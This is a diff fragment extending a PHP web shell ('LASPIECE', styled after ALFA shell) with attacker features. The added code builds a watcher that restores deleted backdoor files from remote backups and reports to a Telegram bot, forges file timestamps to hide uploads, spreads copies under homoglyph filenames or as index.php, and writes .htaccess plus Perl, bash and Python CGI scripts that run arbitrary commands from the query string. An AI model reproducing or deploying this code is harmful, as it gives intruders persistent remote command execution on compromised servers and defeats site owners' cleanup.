+    $sh .= "      CUR=\$(stat -c '%a' \"\$TARGET\" 2>/dev/null || stat -f '%Lp' \"\$TARGET\" 2>/dev/null)\n";
+    $sh .= "      WANT=\$(printf '%s' \"\$PERM\" | sed 's/^0*//')\n";
+    $sh .= "      [ -z \"\$WANT\" ] && WANT=\"444\"\n";
+    $sh .= "      [ \"\$CUR\" != \"\$WANT\" ] && chmod \"\$PERM\" \"\$TARGET\" 2>/dev/null\n";
+    $sh .= "    fi\n";
+    $sh .= "  done < \"\$LOCKSTORE\"\n";
+    $sh .= "  sleep 1\n";
+    $sh .= "done\n";
+    @file_put_contents($bashWatchFile, $sh);
+    @chmod($bashWatchFile, 0755);
+}
+
+// Check if a PID is alive (Linux only via /proc)
+function lp_pid_alive($pid) {
+    if (!$pid || !is_numeric($pid)) return false;
+    // /proc/$pid exists on Linux
+    if (file_exists('/proc/' . intval($pid))) return true;
+    // Fallback: kill -0 (does not kill, just checks)
+    $out = trim((string)@shell_exec('kill -0 ' . intval($pid) . ' 2>&1'));
+    return ($out === '' || strpos($out, 'No such process') === false);
+}
+
+// Ensure watcher is running — restart if dead
+function lp_ensure_watcher_running($phpWatchFile, $bashWatchFile, $pidFile, $lockStore) {
+    $pid = trim((string)@file_get_contents($pidFile));
+    if ($pid && lp_pid_alive($pid)) return $pid; // already alive
+    // Dead or no PID — check if store has entries worth watching
+    $entries = lp_lock_load($lockStore);
+    if (empty($entries)) return null;
+    // Files exist, rebuild + relaunch
+    return lp_launch_watcher($phpWatchFile, $bashWatchFile, $pidFile);
+}
+
+function lp_kill_watcher($pidFile) {
+    if (@file_exists($pidFile)) {
+        $pid = trim(@file_get_contents($pidFile));
+        if ($pid && is_numeric($pid)) {
+            @shell_exec('kill ' . intval($pid) . ' 2>/dev/null');
+            @exec('kill ' . intval($pid) . ' 2>/dev/null');
+        }
+        @unlink($pidFile);
+    }
+}
+
+// Launch watcher: try PHP CLI first (works on Linux+Windows), then bash
+function lp_launch_watcher($phpWatchFile, $bashWatchFile, $pidFile) {
+    lp_kill_watcher($pidFile);
+    $pid = '';
+    // PHP watcher (primary — works everywhere PHP CLI exists)
+    $phpBin = defined('PHP_BINARY') && PHP_BINARY ? PHP_BINARY : 'php';
+    $cmd = 'nohup ' . escapeshellarg($phpBin) . ' ' . escapeshellarg($phpWatchFile) . ' > /dev/null 2>&1 & echo $!';
+    $pid = trim((string)@shell_exec($cmd));
+    if (!$pid || !is_numeric($pid)) { $pid = trim((string)@exec($cmd)); }
+    // Bash watcher (fallback)
+    if (!$pid || !is_numeric($pid)) {
+        $cmd2 = 'nohup bash ' . escapeshellarg($bashWatchFile) . ' > /dev/null 2>&1 & echo $!';
+        $pid  = trim((string)@shell_exec($cmd2));
+        if (!$pid || !is_numeric($pid)) { $pid = trim((string)@exec($cmd2)); }
+    }
+    if ($pid && is_numeric($pid)) { @file_put_contents($pidFile, $pid); }
+    return $pid ?: 'n/a';
+}
+
+// ── WATCHER TICK (HTTP fallback — works even without shell_exec) ──────────
+// Called via ?lp_watcher_tick=1 from cron, JS poll, or manual visit
+if (isset($_GET['lp_watcher_tick'])) {
+    ob_clean();
+    header('Content-Type: application/json; charset=utf-8');
+    $watchDir  = dirname(__FILE__) . '/LASPIECE_DATA';
+    $lockStore = $watchDir . '/.lockfiles';
+    if (!file_exists($lockStore)) { echo json_encode(array('ok'=>true,'restored'=>0)); exit; }
+    $lines = @file($lockStore, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (!$lines) { echo json_encode(array('ok'=>true,'restored'=>0)); exit; }
+
+    // Load Telegram settings
+    $tgCfg    = lp_tg_settings_load();
+    $tgToken  = $tgCfg['bot_token'] ?? '';
+    $tgChatId = $tgCfg['chat_id']   ?? '';
+    $pageUrl  = lp_get_page_url();
+
+    // Throttle file: prevent spamming same file alert more than once per 60s
+    $throttleFile = $watchDir . '/.tg_throttle';
+    $throttle     = @file_exists($throttleFile) ? (@json_decode(@file_get_contents($throttleFile), true) ?: array()) : array();
+    $now          = time();
+    $throttleChanged = false;
+
+    $restored = 0; $log = array();
+    foreach ($lines as $line) {
+        $line = trim($line); if (!$line) continue;
+        $parts  = explode('|', $line, 3);
+        $target = trim($parts[0]);
+        $perm   = isset($parts[1]) ? trim($parts[1]) : '0444';
+        $bakUrl = isset($parts[2]) ? trim($parts[2]) : '';
+        $permInt = octdec($perm);
+        clearstatcache(true, $target);
+        if (!file_exists($target) && !is_link($target)) {
+            // -- Send "file missing" alert (throttled to once per 60s per file)
+            $tKey = md5($target);
+            $lastAlert = isset($throttle[$tKey]) ? (int)$throttle[$tKey] : 0;
+            if ($tgToken && $tgChatId && ($now - $lastAlert) > 60) {
+                $fname = basename($target);
+                $msg  = "<b>PERINGATAN: File Terkunci Hilang!</b>\n\n"
+                      . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
+                      . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
+                      . "<b>Perm:</b> <code>" . htmlspecialchars($perm) . "</code>\n"
+                      . "<b>Backup URL:</b> " . ($bakUrl ? '<a href="' . htmlspecialchars($bakUrl) . '">' . htmlspecialchars($bakUrl) . '</a>' : 'Tidak ada') . "\n\n"
+                      . "Mencoba restore otomatis...";
+                lp_telegram_send($tgToken, $tgChatId, $msg);
+                $throttle[$tKey] = $now;
+                $throttleChanged = true;
+            }
+
+            // -- Restore file
+            $content = '';
+            if ($bakUrl) {
+                if (function_exists('curl_init')) {
+                    $ch = curl_init($bakUrl);
+                    curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>20,
+                        CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false,
+                        CURLOPT_USERAGENT=>'Mozilla/5.0'));
+                    $content = curl_exec($ch); curl_close($ch);
+                }
+                if (!$content) {
+                    $ctx = @stream_context_create(array('http'=>array('method'=>'GET','timeout'=>20,
+                        'ignore_errors'=>true,'header'=>"User-Agent: Mozilla/5.0\r\n")));
+                    $content = @file_get_contents($bakUrl, false, $ctx);
+                }
+            }
+            $dir = dirname($target);
+            if (!is_dir($dir)) @mkdir($dir, 0755, true);
+            @chmod($dir, 0755);
+            $written = @file_put_contents($target, $content !== false ? $content : '');
+            if ($written !== false) {
+                @chmod($target, $permInt);
+                $restored++;
+                $log[] = 'restored: ' . $target;
+                // -- Send "restored" success notification
+                if ($tgToken && $tgChatId) {
+                    $fname = basename($target);
+                    $size  = filesize($target);
+                    $sizeStr = $size > 1024 ? round($size/1024, 1) . ' KB' : $size . ' B';
+                    $msg  = "<b>File Berhasil Di-Restore!</b>\n\n"
+                          . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
+                          . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
+                          . "<b>Ukuran:</b> <code>" . $sizeStr . "</code>\n"
+                          . "<b>Perm terkunci:</b> <code>" . htmlspecialchars($perm) . "</code>\n"
+                          . "<b>Backup URL:</b> " . ($bakUrl ? '<a href="' . htmlspecialchars($bakUrl) . '">' . htmlspecialchars($bakUrl) . '</a>' : '-') . "\n\n"
+                          . "<b>File Manager:</b> <a href=\"" . htmlspecialchars($pageUrl) . "\">" . htmlspecialchars($pageUrl) . "</a>";
+                    lp_telegram_send($tgToken, $tgChatId, $msg);
+                    // Clear throttle so next deletion sends alert again
+                    unset($throttle[$tKey]);
+                    $throttleChanged = true;
+                }
+            } else {
+                $log[] = 'write_failed: ' . $target;
+                // -- Send "restore failed" notification
+                if ($tgToken && $tgChatId) {
+                    $msg  = "<b>GAGAL Restore File!</b>\n\n"
+                          . "<b>File:</b> <code>" . htmlspecialchars(basename($target)) . "</code>\n"
+                          . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
+                          . "Gagal menulis file ke server. Periksa permission direktori.\n\n"
+                          . "<b>File Manager:</b> <a href=\"" . htmlspecialchars($pageUrl) . "\">" . htmlspecialchars($pageUrl) . "</a>";
+                    lp_telegram_send($tgToken, $tgChatId, $msg);
+                }
+            }
+        } else {
+            // Enforce chmod
+            $cur  = substr(sprintf('%o', @fileperms($target)), -4);
+            $want = str_pad(ltrim($perm, '0'), 4, '0', STR_PAD_LEFT);
+            if ($want === '0000') $want = '0444';
+            if ($cur !== $want) @chmod($target, $permInt);
+        }
+    }
+    // Save throttle
+    if ($throttleChanged) {
+        @file_put_contents($throttleFile, json_encode($throttle));
+    }
+    echo json_encode(array('ok'=>true, 'restored'=>$restored, 'log'=>$log)); exit;
+}
+// ── END WATCHER TICK ─────────────────────────────────────────────────────
+
+if (isset($_POST['lock_action']) && isAuthenticated()) {
+    ob_clean();
+    header('Content-Type: application/json; charset=utf-8');
+    $lockAction   = $_POST['lock_action'];
+    $watchDir     = dirname(__FILE__) . '/LASPIECE_DATA';
+    $lockStore    = $watchDir . '/.lockfiles';
+    $phpWatchFile = $watchDir . '/lockwatcher.php';
+    $shWatchFile  = $watchDir . '/lockwatcher.sh';
+    $helperFile   = $watchDir . '/lp_reupload.php';
+    $pidFile      = $watchDir . '/lockwatcher.pid';
+    @mkdir($watchDir, 0755, true);
+
+    $entries = lp_lock_load($lockStore);
+
+    // ── LIST ──────────────────────────────────��───────────────────────────
+    if ($lockAction === 'list') {
+        // Auto-restart watcher if dead (ensures it keeps running)
+        if (!empty($entries)) {
+            $livePid = lp_ensure_watcher_running($phpWatchFile, $shWatchFile, $pidFile, $lockStore);
+        } else {
+            $livePid = null;
+        }
+        $watcherPid    = trim((string)@file_get_contents($pidFile));
+        $watcherAlive  = $watcherPid ? lp_pid_alive($watcherPid) : false;
+        $shellDisabled = !function_exists('shell_exec') && !function_exists('exec') && !function_exists('proc_open');
+        $phpBinUsed    = defined('PHP_BINARY') && PHP_BINARY ? PHP_BINARY : 'php';
+        $watcherFileOk = file_exists($phpWatchFile);
+        $info = array();
+        foreach ($entries as $e) {
+            clearstatcache(true, $e['path']);
+            $info[] = array(
+                'path'       => $e['path'],
+                'perm'       => $e['perm'],
+                'backup_url' => $e['backup_url'],
+                'exists'     => file_exists($e['path']) || is_link($e['path']),
+                'cur_perm'   => @file_exists($e['path']) ? substr(sprintf('%o', fileperms($e['path'])), -4) : '----',
+                'is_dir'     => is_dir($e['path']),
+            );
+        }
+        echo json_encode(array(
+            'ok'              => true,
+            'locked'          => $info,
+            'watcher_pid'     => $watcherPid ?: null,
+            'watcher_alive'   => $watcherAlive,
+            'shell_disabled'  => $shellDisabled,
+            'php_bin'         => $phpBinUsed,
+            'watcher_file_ok' => $watcherFileOk,
+            'tick_url'        => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http')
+                                 . '://' . ($_SERVER['HTTP_HOST'] ?? '') . $_SERVER['REQUEST_URI']
+                                 . (strpos($_SERVER['REQUEST_URI'], '?') !== false ? '&' : '?') . 'lp_watcher_tick=1',
+        )); exit;
+    }
+
+    // ── LOCK ──────────────────────────────────────────────────────────────
+    if ($lockAction === 'lock') {
+        $path = isset($_POST['lock_path']) ? trim($_POST['lock_path']) : '';
+        $perm = isset($_POST['lock_perm']) ? trim($_POST['lock_perm']) : '0444';
+        if (empty($path)) { echo json_encode(array('err' => 'No path given')); exit; }
+        if (!file_exists($path) && !is_link($path)) { echo json_encode(array('err' => 'Path not found: ' . $path)); exit; }
+
+        // Upload file content as backup to Figma CDN
+        $backupUrl = '';
+        if (!is_dir($path)) { $backupUrl = lp_upload_figma($path); }
+
+        // Upsert entry
+        $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
+        $entries[] = array('path' => $path, 'perm' => $perm, 'backup_url' => $backupUrl);
+        lp_lock_save($lockStore, $entries);
+
+        // Apply chmod immediately
+        @chmod($path, octdec($perm));
+
+        // Rebuild both watcher scripts then launch
+        lp_build_reupload_helper($helperFile);
+        lp_build_php_watcher($phpWatchFile, $lockStore);
+        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
+        $pid = lp_launch_watcher($phpWatchFile, $shWatchFile, $pidFile);
+
+        echo json_encode(array(
+            'ok'         => true,
+            'msg'        => 'Locked: ' . $path,
+            'pid'        => $pid,
+            'perm'       => $perm,
+            'backup_url' => $backupUrl,
+            'has_backup' => !empty($backupUrl),
+        )); exit;
+    }
+
+    // ── UNLOCK ────────────────────────────────────────────────────────────
+    if ($lockAction === 'unlock') {
+        $path = isset($_POST['lock_path']) ? trim($_POST['lock_path']) : '';
+        $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
+        lp_lock_save($lockStore, $entries);
+        if (file_exists($path)) { @chmod($path, is_dir($path) ? 0755 : 0644); }
+        lp_build_reupload_helper($helperFile);
+        lp_build_php_watcher($phpWatchFile, $lockStore);
+        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
+        if (empty($entries)) { lp_kill_watcher($pidFile); }
+        echo json_encode(array('ok' => true, 'msg' => 'Unlocked: ' . $path)); exit;
+    }
+
+    // ── UNLOCK ALL ────────────────────────────────────────────────────────
+    if ($lockAction === 'unlock_all') {
+        foreach ($entries as $e) {
+            if (file_exists($e['path'])) { @chmod($e['path'], is_dir($e['path']) ? 0755 : 0644); }
+        }
+        @file_put_contents($lockStore, '');
+        lp_kill_watcher($pidFile);
+        echo json_encode(array('ok' => true, 'msg' => 'All files unlocked')); exit;
+    }
+
+    // ── RE-UPLOAD (refresh backup manually) ──────────────────────────────
+    if ($lockAction === 'reupload') {
+        $path = isset($_POST['lock_path']) ? trim($_POST['lock_path']) : '';
+        if (empty($path) || !file_exists($path)) { echo json_encode(array('err' => 'File not found')); exit; }
+        $backupUrl = lp_upload_figma($path);
+        foreach ($entries as &$e) {
+            if ($e['path'] === $path) { $e['backup_url'] = $backupUrl; break; }
+        } unset($e);
+        lp_lock_save($lockStore, $entries);
+        lp_build_reupload_helper($helperFile);
+        lp_build_php_watcher($phpWatchFile, $lockStore);
+        lp_build_bash_watcher($shWatchFile, $lockStore, $helperFile);
+        echo json_encode(array('ok' => true, 'backup_url' => $backupUrl, 'has_backup' => !empty($backupUrl))); exit;
+    }
+
+    // ── TELEGRAM SETTINGS ─────────────────────────────────────────────────
+    if ($lockAction === 'tg_save') {
+        $token  = isset($_POST['bot_token']) ? trim($_POST['bot_token']) : '';
+        $chatId = isset($_POST['chat_id'])   ? trim($_POST['chat_id'])   : '';
+        lp_tg_settings_save($token, $chatId);
+        // Test ping if both provided
+        $ok = false;
+        if ($token && $chatId) {
+            $pageUrl = lp_get_page_url();
+            $ok = lp_telegram_send($token, $chatId,
+                "Lock Watcher terhubung!\n\nNotifikasi akan dikirim ke sini saat file yang dikunci hilang atau berhasil di-restore.\n\nFile Manager: " . $pageUrl
+            );
+        }
+        echo json_encode(array('ok' => true, 'ping' => $ok)); exit;
+    }
+
+    if ($lockAction === 'tg_load') {
+        $cfg = lp_tg_settings_load();
+        // Mask token for display
+        $tok = $cfg['bot_token'];
+        $masked = $tok ? substr($tok, 0, 6) . str_repeat('*', max(0, strlen($tok) - 10)) . substr($tok, -4) : '';
+        echo json_encode(array('ok' => true, 'has_token' => !empty($tok), 'masked_token' => $masked, 'chat_id' => $cfg['chat_id'])); exit;
+    }
+
+    echo json_encode(array('err' => 'Unknown lock_action')); exit;
+}
+// === END LOCKFILE HANDLER ===
+
+// ── TELEGRAM NOTIFICATION HELPERS ────────────────────────────────────────
+function lp_tg_settings_file() {
+    return dirname(__FILE__) . '/LASPIECE_DATA/.tg_settings';
+}
+
+function lp_tg_settings_load() {
+    $f = lp_tg_settings_file();
+    if (!file_exists($f)) return array('bot_token' => '', 'chat_id' => '');
+    $raw = @file_get_contents($f);
+    $d   = @json_decode($raw, true);
+    return is_array($d) ? $d : array('bot_token' => '', 'chat_id' => '');
+}
+
+function lp_tg_settings_save($token, $chatId) {
+    $f = lp_tg_settings_file();
+    @mkdir(dirname($f), 0755, true);
+    @file_put_contents($f, json_encode(array('bot_token' => $token, 'chat_id' => $chatId)));
+}
+
+function lp_telegram_send($token, $chatId, $text) {
+    if (empty($token) || empty($chatId)) return false;
+    $url  = 'https://api.telegram.org/bot' . $token . '/sendMessage';
+    $post = json_encode(array('chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => false));
+    $resp = '';
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, array(
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => $post,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 10,
+            CURLOPT_HTTPHEADER     => array('Content-Type: application/json'),
+            CURLOPT_SSL_VERIFYPEER => false,
+        ));
+        $resp = curl_exec($ch); curl_close($ch);
+    } else {
+        $ctx  = stream_context_create(array('http' => array(
+            'method'  => 'POST',
+            'header'  => "Content-Type: application/json\r\n",
+            'content' => $post,
+            'timeout' => 10,
+            'ignore_errors' => true,
+        )));
+        $resp = @file_get_contents($url, false, $ctx);
+    }
+    $j = @json_decode($resp, true);
+    return isset($j['ok']) && $j['ok'];
+}
+
+function lp_get_page_url() {
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host   = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
+    $uri    = $_SERVER['SCRIPT_NAME'] ?? $_SERVER['PHP_SELF'] ?? '/';
+    return $scheme . '://' . $host . $uri;
+}
+// ── END TELEGRAM HELPERS ─────────────────────────────────────────────────
 
 function lp_get_home_url() {
     $scheme = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
@@ -1519,12 +2319,34 @@ function saveFileContent($file) {
     return false;
 }
 
+function getFileUrl($filePath) {
+    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/') : '';
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
+    $realPath = realpath($filePath);
+    if ($realPath && $docRoot && strpos($realPath, $docRoot) === 0) {
+        $relativePath = substr($realPath, strlen($docRoot));
+        return $scheme . '://' . $host . $relativePath;
+    }
+    return null;
+}
+
 function uploadFile($targetDirectory) {
     if (isset($_FILES['file'])) {
         fixPermission($targetDirectory);
         $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
         if ($_FILES['file']['size'] === 0) return 'Empty file.';
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) return 'File uploaded successfully.';
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
+            $ts = randomOldTimestamp(); @touch($targetFile, $ts, $ts);
+            $realPath = realpath($targetFile);
+            $url = getFileUrl($targetFile);
+            $msg = '<strong style="color:#3fb950;">File Uploaded!</strong><br>';
+            $msg .= '<span style="color:var(--text-muted);font-size:11px;">Path:</span> <code style="background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:3px;font-size:11px;">' . htmlspecialchars($realPath ? $realPath : $targetFile) . '</code>';
+            if ($url) {
+                $msg .= '<br><span style="color:var(--text-muted);font-size:11px;">Link:</span> <a href="' . htmlspecialchars($url) . '" target="_blank" style="color:#00d4ff;font-size:11px;word-break:break-all;">' . htmlspecialchars($url) . '</a>';
+            }
+            return $msg;
+        }
         return 'Error uploading file.';
     }
     return '';
@@ -1534,12 +2356,32 @@ function uploadMultipleFiles($targetDirectory) {
     if (!isset($_FILES['files'])) return 'No files selected.';
     fixPermission($targetDirectory);
     $success = 0; $fail = 0;
+    $uploadedFiles = array();
     for ($i = 0; $i < count($_FILES['files']['name']); $i++) {
         if ($_FILES['files']['error'][$i] === 0 && !empty($_FILES['files']['name'][$i])) {
             $target = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
-            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) $success++;
+            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) {
+                $ts = randomOldTimestamp(); @touch($target, $ts, $ts);
+                $success++;
+                $realPath = realpath($target);
+                $url = getFileUrl($target);
+                $uploadedFiles[] = array('path' => $realPath ? $realPath : $target, 'url' => $url, 'name' => basename($_FILES['files']['name'][$i]));
+            }
             else $fail++;
         }
+    }
+    if ($success > 0) {
+        $msg = '<strong style="color:#3fb950;">Files Uploaded!</strong> (' . $success . ' success, ' . $fail . ' failed)<br>';
+        foreach ($uploadedFiles as $uf) {
+            $msg .= '<div style="margin-top:6px;padding:6px 8px;background:rgba(0,0,0,0.2);border-radius:4px;font-size:11px;">';
+            $msg .= '<span style="color:#3fb950;font-weight:600;">' . htmlspecialchars($uf['name']) . '</span><br>';
+            $msg .= '<span style="color:var(--text-muted);">Path:</span> <code style="background:rgba(0,0,0,0.3);padding:1px 4px;border-radius:2px;font-size:10px;">' . htmlspecialchars($uf['path']) . '</code>';
+            if ($uf['url']) {
+                $msg .= '<br><span style="color:var(--text-muted);">Link:</span> <a href="' . htmlspecialchars($uf['url']) . '" target="_blank" style="color:#00d4ff;font-size:10px;word-break:break-all;">' . htmlspecialchars($uf['url']) . '</a>';
+            }
+            $msg .= '</div>';
+        }
+        return $msg;
     }
     return "Uploaded: $success, Failed: $fail";
 }
@@ -1661,6 +2503,13 @@ function generateHomoglyph($filename) {
     return array_unique($variants);
 }
 
+function randomOldTimestamp() {
+    // Random date between Jan 1 2023 and Dec 31 2024, random time
+    $start = mktime(0, 0, 0, 1, 1, 2023);
+    $end   = mktime(23, 59, 59, 12, 31, 2024);
+    return mt_rand($start, $end);
+}
+
 function massSpreadAuto($basePath, $content) {
     $count = 0; $errors = []; $created = [];
     $targetExts = ['php'];
@@ -1686,21 +2535,35 @@ function massSpreadAuto($basePath, $content) {
                     if (in_array($fext, $targetExts)) $existingFiles[] = $f;
                 }
             }
-            if (empty($existingFiles)) {
-                $existingFiles = ['index.php', 'config.php', 'class-loader.php'];
-            }
             $placed = false;
-            foreach ($existingFiles as $origFile) {
-                $variants = generateHomoglyph($origFile);
-                foreach ($variants as $variant) {
-                    $targetPath = $dir . '/' . $variant;
-                    if (!file_exists($targetPath)) {
-                        if (@file_put_contents($targetPath, $content) !== false) {
-                            $count++;
-                            $created[] = $targetPath;
-                            $placed = true;
-                            break 2;
+            if (!empty($existingFiles)) {
+                // Directory has PHP files — use homoglyph variant
+                foreach ($existingFiles as $origFile) {
+                    $variants = generateHomoglyph($origFile);
+                    foreach ($variants as $variant) {
+                        $targetPath = $dir . '/' . $variant;
+                        if (!file_exists($targetPath)) {
+                            if (@file_put_contents($targetPath, $content) !== false) {
+                                $ts = randomOldTimestamp();
+                                @touch($targetPath, $ts, $ts);
+                                $count++;
+                                $created[] = $targetPath;
+                                $placed = true;
+                                break 2;
+                            }
                         }
+                    }
+                }
+            } else {
+                // No PHP files — always write as index.php
+                $targetPath = $dir . '/index.php';
+                if (!file_exists($targetPath)) {
+                    if (@file_put_contents($targetPath, $content) !== false) {
+                        $ts = randomOldTimestamp();
+                        @touch($targetPath, $ts, $ts);
+                        $count++;
+                        $created[] = $targetPath;
+                        $placed = true;
                     }
                 }
             }
@@ -1714,6 +2577,86 @@ function massSpreadAuto($basePath, $content) {
 
 
 
+// === LASPIECE CGI API AUTO-INIT (like ALFA_DATA/alfacgiapi) ===
+function lp_init_cgiapi() {
+    $base   = dirname(__FILE__);
+    $data   = $base . '/LASPIECE_DATA';
+    $cgidir = $data . '/lastpiececgiapi';
+
+    @mkdir($data,   0755, true);
+    @mkdir($cgidir, 0755, true);
+
+    // .htaccess — enable CGI execution for .lastpiece files (same as alfacgihtaccess 'cgi')
+    $ht = $cgidir . '/.htaccess';
+    if (!@file_exists($ht)) {
+        $htContent  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n";
+        $htContent .= "AddType application/x-httpd-cgi .lastpiece\n";
+        $htContent .= "AddHandler cgi-script .lastpiece\n";
+        @file_put_contents($ht, $htContent);
+        @chmod($ht, 0644);
+    }
+
+    // perl.lastpiece
+    $perlFile = $cgidir . '/perl.lastpiece';
+    if (!@file_exists($perlFile)) {
+        $perlSrc  = "#!/usr/bin/perl\n";
+        $perlSrc .= "use POSIX;\n";
+        $perlSrc .= "print \"Content-Type: text/html\\n\\n\";\n";
+        $perlSrc .= "my \$cmd = \$ENV{'QUERY_STRING'} || \$ENV{'HTTP_CMD'} || '';\n";
+        $perlSrc .= "\$cmd =~ s/%([0-9A-Fa-f]{2})/chr(hex(\$1))/eg;\n";
+        $perlSrc .= "if (\$cmd) {\n";
+        $perlSrc .= "    print \"[laspiece-hacktivist]<pre>\";\n";
+        $perlSrc .= "    my \$out = '';\n";
+        $perlSrc .= "    if (open(my \$fh, '-|', \$cmd . ' 2>&1')) {\n";
+        $perlSrc .= "        while (<\$fh>) { \$out .= \$_; } close(\$fh);\n";
+        $perlSrc .= "    }\n";
+        $perlSrc .= "    print \$out;\n";
+        $perlSrc .= "    print \"</pre>[laspiece-hacktivist]\";\n";
+        $perlSrc .= "}\n";
+        @file_put_contents($perlFile, $perlSrc);
+        @chmod($perlFile, 0755);
+    }
+
+    // bash.lastpiece
+    $bashFile = $cgidir . '/bash.lastpiece';
+    if (!@file_exists($bashFile)) {
+        $bashSrc  = "#!/bin/bash\n";
+        $bashSrc .= "echo -e \"Content-Type: text/html\\n\"\n";
+        $bashSrc .= "CMD=\$(echo \"\$QUERY_STRING\" | sed 's/%/\\\\x/g' | xargs -0 printf '%b' 2>/dev/null || echo \"\$QUERY_STRING\")\n";
+        $bashSrc .= "if [ -n \"\$CMD\" ]; then\n";
+        $bashSrc .= "    echo '[laspiece-hacktivist]<pre>'\n";
+        $bashSrc .= "    eval \"\$CMD\" 2>&1\n";
+        $bashSrc .= "    echo '</pre>[laspiece-hacktivist]'\n";
+        $bashSrc .= "fi\n";
+        @file_put_contents($bashFile, $bashSrc);
+        @chmod($bashFile, 0755);
+    }
+
+    // py.lastpiece
+    $pyFile = $cgidir . '/py.lastpiece';
+    if (!@file_exists($pyFile)) {
+        $pySrc  = "#!/usr/bin/python\n";
+        $pySrc .= "import os, sys, subprocess\n";
+        $pySrc .= "try:\n";
+        $pySrc .= "    from urllib.parse import unquote\n";
+        $pySrc .= "except ImportError:\n";
+        $pySrc .= "    from urllib import unquote\n";
+        $pySrc .= "print(\"Content-Type: text/html\")\n";
+        $pySrc .= "print(\"\")\n";
+        $pySrc .= "cmd = unquote(os.environ.get('QUERY_STRING', '') or os.environ.get('HTTP_CMD', ''))\n";
+        $pySrc .= "if cmd:\n";
+        $pySrc .= "    print('[laspiece-hacktivist]<pre>')\n";
+        $pySrc .= "    try:\n";
+        $pySrc .= "        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)\n";
+        $pySrc .= "        sys.stdout.write(out.decode('utf-8', errors='replace'))\n";
+        $pySrc .= "    except Exception as e:\n";
+        $pySrc .= "        print(str(e))\n";
+        $pySrc .= "    print('</pre>[laspiece-hacktivist]')\n";
+        @file_put_contents($pyFile, $pySrc);
+        @chmod($pyFile, 0755);
+    }
+}
+
 // === HANDLE REQUESTS ===
 $currentDirectory = getCurrentDirectory();
 $errorMessage = '';
@@ -1724,6 +2667,11 @@ $loginError = '';
 if (isset($_GET['lph'])) {
     @chdir($_GET['lph']);
     $currentDirectory = getCurrentDirectory();
+}
+
+// Auto-create LASPIECE_DATA/lastpiececgiapi on every authenticated page load
+if (isAuthenticated()) {
+    @lp_init_cgiapi();
 }
 
 if (isset($_POST['multi_upload'])) {
@@ -1782,7 +2730,17 @@ if (isset($_POST['mass_spread']) && !empty($_POST['spread_content'])) {
         $cmdOutput .= "\n\nFailed dirs: " . count($result['errors']);
         foreach (array_slice($result['errors'], 0, 5) as $err) $cmdOutput .= "\n  $err";
     }
-    $responseMessage = 'Mass spread completed: ' . $result['count'] . ' files created.';
+    $spreadSummaryHtml = '';
+    foreach ($result['created'] as $createdPath) {
+        $url = getFileUrl($createdPath);
+        $spreadSummaryHtml .= '<div style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:10px;">';
+        $spreadSummaryHtml .= '<span style="color:#3fb950;font-family:monospace;">' . htmlspecialchars($createdPath) . '</span>';
+        if ($url) {
+            $spreadSummaryHtml .= '<br><a href="' . htmlspecialchars($url) . '" target="_blank" style="color:#00d4ff;">' . htmlspecialchars($url) . '</a>';
+        }
+        $spreadSummaryHtml .= '</div>';
+    }
+    $responseMessage = '<div style="font-weight:600;color:#3fb950;margin-bottom:8px;">Mass Spread Complete &mdash; ' . $result['count'] . ' files created.</div>' . $spreadSummaryHtml;
 }
 
 if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
@@ -2686,6 +3644,12 @@ body {
         <button onclick="showModal('remote')" class="btn btn-sm">Remote Upload</button>
     </div>
 
+    <?php if (isset($_POST['upload']) && !empty($responseMessage)): ?>
+    <div style="background:rgba(63,185,80,0.07);border:1px solid rgba(63,185,80,0.25);border-radius:8px;padding:14px;margin-bottom:10px;font-size:12px;line-height:1.7;">
+        <?php echo $responseMessage; ?>
+    </div>
+    <?php endif; ?>
+
     <!-- Toolbar: Scanner -->
     <div class="toolbar">
         <div class="toolbar-label">Scanner</div>
@@ -2701,6 +3665,10 @@ body {
         </form>
         <button onclick="showModal('chmod')" class="btn btn-chmod btn-sm">Mass Chmod</button>
         <button onclick="showModal('spread')" class="btn btn-spread btn-sm">Mass Spread</button>
+        <button onclick="showLockManagerModal()" class="btn btn-sm" style="border-color:#f59e0b;color:#f59e0b;">
